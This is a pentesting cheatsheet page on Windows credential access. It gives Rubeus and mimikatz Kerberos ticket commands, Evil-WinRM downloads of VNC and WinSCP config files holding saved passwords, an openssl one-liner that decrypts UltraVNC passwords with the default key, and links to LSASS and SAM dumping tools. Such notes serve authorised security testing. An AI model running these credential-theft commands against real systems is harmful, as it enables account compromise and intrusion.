---
layout: post
title: TA0006 Credentials Access - Windows
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2023-03-13
permalink: /:categories/:title/
---

<!-- vscode-markdown-toc -->
* [Multi-features Hacking Tools](#Multi-featuresHackingTools)
* [T1558: Steal and Forge Kerberos Tickets](#T1558:StealandForgeKerberosTickets)
	* [Which OS ? What Creds ?](#WhichOSWhatCreds)
	* [Rubeus](#Rubeus)
	* [Kerberos ASKTGT](#KerberosASKTGT)
	* [Import / Export Tickets](#ImportExportTickets)
* [LSASS.exe dump](#LSASS.exedump)
* [SAM dump](#SAMdump)
* [Services](#Services)
* [Scheduled Tasks](#ScheduledTasks)
* [Sofwares](#Sofwares)
	* [Automated](#Automated)
	* [mRemoteNG](#mRemoteNG)
	* [xVNC](#xVNC)
	* [WinSCP](#WinSCP)
	* [Putty](#Putty)
	* [Web Browsers](#WebBrowsers)
* [NTDS.dit dump](#NTDS.ditdump)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='Multi-featuresHackingTools'></a>Multi-features Hacking Tools

<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<script>$(window).load(function() {var repos = ["https://api.github.com/repos/gentilkiwi/mimikatz/","https://api.github.com/repos/skelsec/pypykatz", "https://api.github.com/repos/SecureAuthCorp/impacket", "https://api.github.com/repos/Hackndo/lsassy", "https://api.github.com/repos/deepinstinct/Lsass-Shtinkering","https://api.github.com/repos/D1rkMtr/DumpThatLSASS","https://api.github.com/repos/codewhitesec/HandleKatz","https://api.github.com/repos/Z4kSec/Masky","https://api.github.com/repos/login-securite/DonPAPI","https://api.github.com/repos/Processus-Thief/HEKATOMB","https://api.github.com/repos/AlessandroZ/LaZagne"]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.updated_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>

<link href="/sortable.css" rel="stylesheet" />
<script src="/sortable.js"></script>
<div id="repos">
    <table id="repo_list" class="sortable">
      <tr><th>repo</th><th>last update</th><th>stars</th><th>watch</th><th>language</th></tr>
    </table>
</div>

## <a name='T1558:StealandForgeKerberosTickets'></a>T1558: Steal and Forge Kerberos Tickets 

### <a name='WhichOSWhatCreds'></a>Which OS ? What Creds ?

![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)

TO READ: 
* [OS credentials dumping - mitre T1003](https://attack.mitre.org/techniques/T1003/001/)
* [LSA RunAsPPL protection](https://itm4n.github.io/lsass-runasppl/)

### <a name='Rubeus'></a>Rubeus 

- [Wiki](https://github.com/GhostPack/Rubeus)
- Compilation :
```powershell
# compilation
```

### <a name='KerberosASKTGT'></a>Kerberos ASKTGT 
```powershell
# Path on VM Mandiant Commando
cd C:\Tools\GhostPack\Rubeus\Rubeus\bin\Debug
./Rubeus.exe asktgt /user:$zlat_user /password:"PASSWORD" /domain:$zdom /dc:$zdom_dc_fqdn /ptt
```

### <a name='ImportExportTickets'></a>Import / Export Tickets
```powershell
cd C:\tools\mimikatz\x64
mimikatz.exe privilege:debug
kerberos::list /export
```

## <a name='LSASS.exedump'></a>LSASS.exe dump

- [redteamrecipe 50 methods](https://redteamrecipe.com/50-Methods-For-Dump-LSASS/) 🔥
- [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)

## <a name='SAMdump'></a>SAM dump

- [registry & vss](https://nored0x.github.io/red-teaming/Windows-Credentials-SAM-Database-part-1/)

## <a name='Services'></a>Services

## <a name='ScheduledTasks'></a>Scheduled Tasks

## <a name='Sofwares'></a>Sofwares

### <a name='Automated'></a>Automated

<script>$(window).load(function() {var reposs = ["https://github.com/Arvanaghi/SessionGopher", "https://github.com/EncodeGroup/Gopher", "https://api.github.com/repos/login-securite/DonPAPI","https://api.github.com/repos/AlessandroZ/LaZagne"]; for (repp in reposs) {$.ajax({type: "GET", url: reposs[repp], dataType: "json", success: function(result) {$("#repo_listt").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.updated_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>

<div id="reposs">
    <table id="repo_listt" class="sortable">
      <tr><th>repo</th><th>last update</th><th>stars</th><th>watch</th><th>language</th></tr>
    </table>
</div>

### <a name='mRemoteNG'></a>mRemoteNG

- [password decryption](https://github.com/S3cur3Th1sSh1t/mRemoteNG-Decrypt)

### <a name='xVNC'></a>xVNC

* VNC softwares properties:  

| software | registry key | ini file |
|----------|--------------|--------|
| RealVNC | HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver | C:\Program Files\RealVNC\ |
| TightVNC | HKEY_CURRENT_USER\Software\TightVNC\Server | C:\Program Files\TightVNC\ |
| TigerVNC | HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 | C:\Program Files\TigerVNC\ |
| UltraVNC | | C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini |

* Example of download of the ini file:
```
Evil-winRM > download "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /tmp/ultravnc.ini
```

* UtltraVNC specificities

passwd - full control password
passwd2 - read-only password
```
# des decryption using the ultravnc default decryption key 'e84ad660c4721ae0' 
echo -n passwd | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv

# test the password / vnc access
vncsnapshot 1.2.3.4 pwned_desktop_x.png
```


### <a name='WinSCP'></a>WinSCP

* Get an RDP session
* Check if there are saved passwords
* Export the configuration
* Download of the ini file:
```
Evil-winRM > download "C:\Windows\Temp\winscp.ini" /tmp/winscp.ini
```

### <a name='Putty'></a>Putty

### <a name='WebBrowsers'></a>Web Browsers
- [chrome / mac os](https://github.com/breakpointHQ/chrome-bandit)

## <a name='NTDS.ditdump'></a>NTDS.dit dump